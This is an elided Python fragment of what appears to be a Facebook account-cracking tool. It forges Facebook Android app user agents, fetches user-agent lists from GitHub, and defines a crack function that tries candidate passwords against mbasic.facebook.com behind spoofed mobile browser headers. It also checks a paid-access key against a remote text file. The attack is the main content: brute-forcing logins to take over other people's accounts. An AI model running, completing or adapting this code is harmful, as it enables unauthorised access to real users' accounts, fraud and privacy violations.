...
for x in range(10):
	...
	l='Mobile/18G82 [FBAN/FB4A;FBAV/336.0.0.20.117;FBPN/com.facebook.katana;FBLC/zh_TW_#Hant;FBBV/317766059;FBCR/&amp;#21488-&amp;#28771-&amp;#22823-&amp;#21733-&amp;#22823-;FBMF/asus;FBBD/asus;FBDV/ASUS_I005DC;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2322};FB_FW/1;FBRV/0;]'
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/DH-Alamin/chil/blob/main/ua.text').text
		ua=open('.bbnew.txt','w')
...
def crack(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			ses.headers.update({'Host': 'mbasic.facebook.com','accept': 'tllext/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8','cache-control': 'max-age=0','dpr': '2.75','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"','sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"23053RN02A"','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"14.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua,'viewport-width': '980',})
...
def Subscraption():
	r1=requests.get("https://github.com/Princecyberxyz/CYBERXYZ/blob/main/PAIDTOOLSXYZ.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
